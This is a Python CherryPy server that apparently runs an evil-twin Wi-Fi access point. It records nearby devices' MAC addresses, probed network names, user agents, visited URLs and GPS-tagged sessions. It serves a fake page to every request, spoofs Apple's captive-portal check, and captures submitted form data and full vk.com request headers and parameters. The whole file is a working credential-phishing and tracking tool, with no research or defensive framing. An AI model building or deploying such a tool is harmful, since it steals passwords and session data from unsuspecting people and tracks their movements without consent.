#!/usr/bin/python
# coding=UTF-8
import cherrypy
import os
import re
import threading
import time
import sqlite3
from threading import Thread
from time import sleep
from mako.template import Template
from mako.lookup import TemplateLookup
from datetime import datetime,timedelta
import functools
import urllib2
import phones
import gpspoller

lookup = TemplateLookup(directories=['html'],default_filters=['decode.utf8'],input_encoding='utf-8',output_encoding='utf-8',encoding_errors='ignore')
clients = {}
wireless = {}
dataFormID = 'verysecuredata'
wirelessLock = threading.RLock()
cachedIndex = None
tls = threading.local()
session_interval = 3600 # 1 hour in seconds
gps = gpspoller.initGps()

def newClient():
    new = {}
    new['probes'] = set()    
    new['agents'] = set()
    new['urls'] = set()
    new['os'] = None
    new['model'] = None
    return new
def getClientByMAC(mac,cursor):
    if mac in wireless:
        return wireless[mac]
    with wirelessLock:
        if mac in wireless:
            return wireless[mac]
        new = newClient()
        new['mac'] = mac
        wireless[mac] = new
        cursor.execute("SELECT ssid,os,model FROM clients WHERE mac=?",(mac,))
        row = cursor.fetchone()
        if row==None:
            cursor.execute("INSERT into clients (mac,added,last) values (?,?,?)",(mac,datetime.now(),datetime.now()))
        else:
            ssid = row[0]
            if ssid is not None:
                new['ssid'] = row[0]
            new['os']=row[1] 
            new['model']=row[2]
        return new
def getClientByIP(ip,cursor):
    if ip in clients:
        print 'cached'
        return clients[ip]
    print "getClientsByIP",ip
    with wirelessLock:
        if ip in clients:
            return clients[ip]
        dhcp = getDhcpInfo(ip)
        if dhcp is None:
            mac = '00:00:00:00:00:00'
            name = None
        else:
            mac = dhcp.get("mac",'00:00:00:00:00:00');
            name = dhcp.get("name")
        client = getClientByMAC(mac,cursor)
        client['ip'] = ip
        client['name'] = name
        clients[ip]=client
        cursor.execute("UPDATE clients SET name=?,ip=? WHERE mac=?",(name,ip,mac))
        return client
def getDhcpInfo(testip):
    with open("/var/lib/misc/dnsmasq.leases") as f:
        for line in f:
            (expire,mac,ip,name,mac2)=line.split()
            if ip==testip:
                return {'mac':mac.upper(),'name':name}
        return None
def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d
class Site(object):
    @cherrypy.expose
    def rawlog(self):
        with open ("/var/log/cherry_other.log", "r") as myfile:
            data=myfile.read().replace('\n', '<br>')
            return data
    @cherrypy.expose
    def mylog(self):
        tmpl = lookup.get_template("log.html")
        con = get_con(row_factory=dict_factory)
        with con:
            cursor = con.cursor()
            stats = {}
            now = datetime.now()
            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL")
            stats['ass_total'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND last>?",(now-timedelta(hours=1),))
            stats['ass_last_hour'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND added>?",(now-timedelta(hours=1),))
            stats['ass_last_hour_new'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND last>?",(now-timedelta(days=1),))
            stats['ass_last_day'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients where ip is NOT NULL AND added>?",(now-timedelta(days=1),))
            stats['ass_last_day_new'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients")
            stats['probe_total'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients where last>?",(now-timedelta(hours=1),))
            stats['probe_last_hour'] = cursor.fetchone()['count']

            test  = now-timedelta(hours=1)
            print "test",test
            cursor.execute("SELECT COUNT(*) as count FROM clients where added>?",(now-timedelta(hours=1),))
            stats['probe_last_hour_new'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients WHERE last>?",(now-timedelta(days=1),))
            stats['probe_last_day'] = cursor.fetchone()['count']

            cursor.execute("SELECT COUNT(*) as count FROM clients WHERE added>?",(now-timedelta(days=1),))
            stats['probe_last_day_new'] = cursor.fetchone()['count']

            print "stats",stats

            cursor.execute("""SELECT clients.*,vendors.vendor as vendor,
                              (SELECT COUNT(*) FROM sessions where sessions.mac=clients.mac) as sessions,
                              (SELECT first FROM sessions where sessions.mac=clients.mac ORDER BY last desc LIMIT 1)  as sfirst,
                              (SELECT last FROM sessions where sessions.mac=clients.mac ORDER BY last desc LIMIT 1)  as slast
                              FROM clients,vendors 
                              WHERE substr(replace(mac,':',''),1,6)==prefix AND  ip IS NOT NULL 
                              ORDER BY last desc LIMIT 100""")
            
#            cursor.execute("SELECT clients.*,vendors.vendor as vendor FROM clients,vendors WHERE prefix(mac)==prefix ORDER BY last desc")
            clients = cursor.fetchall()
            i = 0
            for c in clients:
                print c
                i = i+1
                if i==2:
                    break
#            print clients
#            with open("test.txt","w") as log:
#                for c in clients:
#                    log.write(c['vendor'])
#                    log.write("\n")
                    
            return tmpl.render(clients=clients,stats=stats)

    @cherrypy.expose
    def mydetails(self, mac):
        tmpl = lookup.get_template("details.html")
        con = get_con(row_factory=dict_factory)
        with con:
            cursor = con.cursor()
            cursor.execute("SELECT * FROM clients WHERE mac=?",(mac,))
            client = cursor.fetchone()
            print client
            if client is None:
                return "no data"
            cursor.execute("SELECT ssid FROM probes WHERE mac=?",(mac,))
            probes = cursor.fetchall()
            cursor.execute("SELECT agent FROM agents WHERE mac=?",(mac,))
            agents = cursor.fetchall()
            cursor.execute("SELECT url FROM urls WHERE mac=?",(mac,))
            urls = cursor.fetchall()

            cursor.execute("SELECT first,last,latitude,longitude,gps_reliable FROM sessions WHERE mac=? ORDER BY first DESC",(mac,))
            sessions = cursor.fetchall()

            return tmpl.render(info=client,probes=probes,agents=agents,sessions=sessions,urls=urls)

    @cherrypy.expose
    def mystats(self):
        tmpl = lookup.get_template("stats.html")
        return tmpl.render(pos=gps.get())

    @cherrypy.expose
    def default(self,*args,**kwargs):
        start = time.time()
        result= self.default_body(*args,**kwargs)
        end = time.time()
        print "measure",end - start
        return result
    def default_body(self,*args,**kwargs):
        global cachedIndex
        headers =  cherrypy.request.headers
        ip = headers['Remote-Addr']
        agent = headers.get('User-Agent')
        host = headers.get('Host')
        info = {}
        new = False        
        con = get_con()
        with con:
            cursor = con.cursor()
            client = getClientByIP(ip,cursor)
            updateLastSeen(client,cursor)
            mac=client['mac']
            name=client.get('name')
            ssid=client.get('ssid')
            agents = client['agents']
            urls = client['urls']

            try:
                if (client["os"] is None or client["model"] is None) and agent:
                    os_info = phones.parse_agent(agent)
                    print agent,"os_info",os_info
                    if os_info:
                        if os_info[0]!=client["os"] or os_info[1]!=client["model"]:
                            print "update os info"
                            cursor.execute("UPDATE clients SET os=?,model=? WHERE mac=?",(os_info[0],os_info[1],mac))
            except:
                print "os fail"
            if agent is not None and agent not in agents:
                cursor.execute("INSERT OR IGNORE INTO agents (mac,agent,added)  VALUES (?,?,?)",(mac,agent,datetime.now()))
                print 'add agent'
                agents |= {agent}
            url = cherrypy.url()

            if url is not None and url not in urls:
                cursor.execute("INSERT OR IGNORE INTO urls (mac,url,added)  VALUES (?,?,?)",(mac,url,datetime.now()))
                urls |= {url}

            #print "!!URL!!%s!!%s" % (mac,url)
            cherrypy.log("!!URL!!%s!!%s" % (mac,url))
            if 'vk.com' in  url:
                cherrypy.log("vk: %s" % (str(headers),))
                cherrypy.log("vk data: %s" % (str(kwargs),))
            if 'client.saw.fake.ui.jpg' in url:
                cherrypy.log("client [%s,%s,%s,%s] saw fake UI" % (mac,name,ip,ssid))
                if 'saw' not in client or not client['saw']:
                    client['saw'] = True
                    print 'saw'
                    cursor.execute("UPDATE clients SET saw=? WHERE mac=?",(1,mac))
                return ""
#        if new:
#            cherrypy.log("client '%s' %s %s %s %s" % (ssid,mac,name,ip,agent))
            if (dataFormID in kwargs):
                data=kwargs[dataFormID]
                client['data']=data
                cherrypy.log("submit: [%s,%s,%s,%s]->%s,agent %s,DATA %s" % (ip,mac,name,ssid,url,agent,data))        
                cursor.execute("UPDATE clients SET data=? WHERE mac=?",(data,mac))
                print 'data'
        if agent and "CaptiveNetworkSupport" in agent:
            print "!!!!!CaptiveNetworkSupport!!! processed"
            cherrypy.response.status=200
            return "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
        return cachedIndex
"""        newheaders = {} 
        for h in headers:
            if h=='Remote-Addr' or h=='Accept-Encoding':
                continue
            newheaders[h] = headers[h]

        #print url,":",newnheaders
        #Remote-Addr
        req = urllib2.Request(url)
        for h in newheaders:
            req.add_header(h,newheaders[h])
            print h,"@@=@@",newheaders[h]

        response = urllib2.urlopen(req)
        #print "!!!!!!!geturl!!!!!!!", response.geturl()
        #print "!!!!!!!!!info!!!!!!!!!!", response.info().headers
        #print "!!!getplist!!!!",response.getplist()
        #print "!!!!!!!!!getcode!!!!!!!!!!", response.getcode()

        html = response.read()
        resp = cherrypy.response
        #print html
        resp.body = html
        
        print html
        #with open('myfile','w') as f:
        #    f.write(html)

        print "response.getcode()",response.getcode()
        rheaders = response.info().dict
        for h in rheaders:
            if h=='transfer-encoding':
                continue
            print h,"!=!",rheaders[h]
            cherrypy.response.headers[h] = rheaders[h]
        cherrypy.response.status=response.getcode()
        #print url,"-",len(html)
        #raise ValueError('A very specific bad thing happened')
        return html
"""

def follow(thefile):
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def newSession(cursor,mac,time,gpspos):
    session = {}
    cursor.execute("INSERT INTO sessions (mac,first,last) VALUES (?,?,?)",(mac,time,time))
    print "new session ",cursor.lastrowid,"-",mac,"-",time
    session['id'] = cursor.lastrowid
    session['first'] = time
    session['last'] = time
    session['timer'] = None
    session["latitude"] = None
    session["longitude"] = None
    session["gps_reliable"] = None
    if gpspos:
        session['latitude'] = gpspos[0]
        session['longitude'] = gpspos[1]
        session['gps_reliable'] = gpspos[2]
    return session
def saveSession(client,cursor):
    session = client['session']
    last = session['last']
    mac = client['mac']
    print "save",session
 #   print "save session ",session['id'],"-",mac,"-",last
#    cursor.execute("UPDATE sessions SET last=?,latitude=?,longitude=?,gps_reliable=? WHERE id=?",(last,session['latitude'],session["longitude"],session["gps_reliable"],session['id']))
    cursor.execute("UPDATE sessions SET last=? WHERE id=?",(last,session['id']))
    cursor.execute("UPDATE clients SET last=? WHERE mac=?",(last,mac))


updateDict = {}
updateLock = threading.RLock()
updateTimer = None

def updateClients():
    global updateTimer,updateDict
    start = time.time()
#    print "START !!!!!!!!!delayed save!!!!!!!"
    with updateLock:
        con = get_con()
        with con:
            cursor = con.cursor()
            for mac,client in updateDict.iteritems():
                saveSession(client,cursor)
            updateDict = {}
            updateTimer = None
    end = time.time()
#    print "measure updateClients",end - start
#    print "END !!!!!!!!!delayed save!!!!!!!"

def updateLastSeen(client,cursor):
    global updateTimer,updateDict
    now = datetime.now()
    mac = client['mac']
    gpspos = gps.get()
    if 'session' not in client:
 #       print "session is not in client"
        cursor.execute("SELECT id,first,last,mac,latitude,longitude,gps_reliable from sessions WHERE mac=? ORDER BY last DESC LIMIT 1",(mac,))
        last_session = cursor.fetchone()
        if last_session is None:
            client['session'] = newSession(cursor,mac,now,gpspos)
            saveSession(client,cursor)
        else:
#            print "last",last_session
            session = {}
            session['id'] = last_session[0]
            session['first'] = last_session[1]
            session['last'] = last_session[2]
            session['timer'] = None
            session['latitude']=last_session[4]
            session['longitude']=last_session[5]
            session['gps_reliable']=last_session[6]
            client['session'] = session
    session = client['session']
    if (now-session['last']).total_seconds()>session_interval:
        print "INTERVAL EXCEEDED;NEW SESSION"
        saveSession(client,cursor)
        session = newSession(cursor,mac,now,gpspos)
        client['session'] = session
        saveSession(client,cursor)
    elif now>session['last']:
        client['last'] = now
        session['last'] = now
        if gpspos:
            if gpspos[2]>0 or session['latitude']==None:
               session['latitude'] = gpspos[0]
               session['longitude'] = gpspos[1]
               session['gps_reliable'] = gpspos[2]

        with updateLock:
#            print "update client ",mac," with delay"
            updateDict[mac] = client
            if updateTimer is None:
                updateTimer = threading.Timer(30, updateClients)
                updateTimer.start()

        #saveSession(client,cursor)
        
"""
        start = time.time()
        result= self.default_body(*args,**kwargs)
        end = time.time()
        print "measure",end - start
        return result

"""
def cleansid(sid):
    try:
        return sid.decode("utf-8")
    except:
        return "invalid"
def airbaseReader():
    logfile = open("/var/log/airbase/airbase.log","r")
    probe=re.compile('directed probe request from ([a-f0-9:]+)\s+-\s+"(.*)"',re.IGNORECASE);
    assoc=re.compile('client\s+([a-f0-9:]+)\s+(?:re)?associated.*ESSID:\s+"(.*)"',re.IGNORECASE);
    con = get_con()
    for line in follow(logfile):
        m = probe.search(line)
        if m:
          mac = m.group(1).upper()
          ssid = cleansid(m.group(2))
          with con:
#              start = time.time()
              cursor = con.cursor()
              w = getClientByMAC(mac,cursor)
              probes = w['probes']
              if ssid not in probes:
                  cursor.execute("INSERT OR IGNORE INTO probes (mac,ssid,added)  VALUES (?,?,?)",(mac,ssid,datetime.now()))
                  probes |= {ssid}
              updateLastSeen(w,cursor)
#          end = time.time()
#          print "measure airbase probe",end - start

        else:
          m = assoc.search(line)
          if m:
              mac = m.group(1).upper()
              ssid = cleansid(m.group(2))
#              start = time.time()
              with con:
                  cursor = con.cursor()
                  w = getClientByMAC(mac,cursor)
                  if 'ssid' not in w or w['ssid'] != ssid:
                      cursor.execute("UPDATE clients SET ssid=? WHERE mac=?",(ssid,mac))
                      w['ssid'] = ssid
                  updateLastSeen(w,cursor)
#              end = time.time()
#              print "measure airbase assoc",end - start

def create_db():
    con = get_con()
    c = con.cursor()
    c.execute("""create table clients (
           mac char(17) UNIQUE ON CONFLICT FAIL,
           ip varchar(255),
           saw integer DEFAULT 0,
           data text,
           name varchar(255),
           os varchar(255),
           model varchar(255),
           added timestamp,
           last timestamp,
           ssid varchar(255))""")
    c.execute("""create table probes (mac char(17),ssid varchar(255),added timestamp)""")
    c.execute("""create unique index probes_index ON probes (mac,ssid)""")
    c.execute("""create table agents (mac char(17),agent text,added timestamp)""")
    c.execute("""create unique index agents_index ON agents (mac,agent)""")
    c.execute("""create table sessions (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             mac char(17),
             first timestamp,
             last timestamp,
             latitude float,
             longitude float,
             gps_reliable integer)""")
    c.execute("""create table urls (mac char(17),url text,added timestamp)""")
    c.execute("""create unique index urls_index ON urls (mac,url)""")

def mac_prefix(mac):
    return mac.replace(":","")[:6]

def setup_con(con,row_factory):
    con.row_factory = sqlite3.Row
    if row_factory is not None:
        con.row_factory = row_factory
    con.text_factory = str
 
    
def connect_db():
    con = sqlite3.connect('clients.db',detect_types=sqlite3.PARSE_DECLTYPES)
    con.create_function("prefix", 1, mac_prefix)
    return con

def get_con(row_factory=None):
    global tls
    try:
        setup_con(tls.con,row_factory)
        return tls.con
    except:
        tls.con = connect_db()
        setup_con(tls.con,row_factory)
        return tls.con
def init_db():
    con = get_con()
    c = con.cursor()

    try:
#        c.execute("""ALTER TABLE sessions  ADD COLUMN latitude float""")
#        c.execute("""ALTER TABLE sessions  ADD COLUMN longitude float""")
#        c.execute("""ALTER TABLE sessions  ADD COLUMN gps_reliable integer""")
        c.execute("SELECT * from clients LIMIT 1")
    except Exception as inst:
        print str(inst)
        create_db()

if __name__ == '__main__':
   cherrypy.server.socket_host = "0.0.0.0"
   cherrypy.server.socket_port = 80
   cherrypy.log.access_file="/var/log/cherry_access.log"
   cherrypy.log.error_file="/var/log/cherry_other.log"
   tmpl = lookup.get_template("index.html")
   init_db()
   thread = Thread(target = airbaseReader)
   thread.daemon = True
   thread.start()
#   while gps.get()==None:
#       pass
#   print "gps:",gps.get()
       
   cachedIndex = tmpl.render()
   conf = {
         '/': {
             'tools.sessions.on': True,
             'tools.staticdir.root': os.path.abspath(os.getcwd()),

         },
         '/static': {
             'tools.staticdir.on': True,
             'tools.staticdir.dir': './static'
         }
     }
   cherrypy.quickstart(Site(),'/',conf)
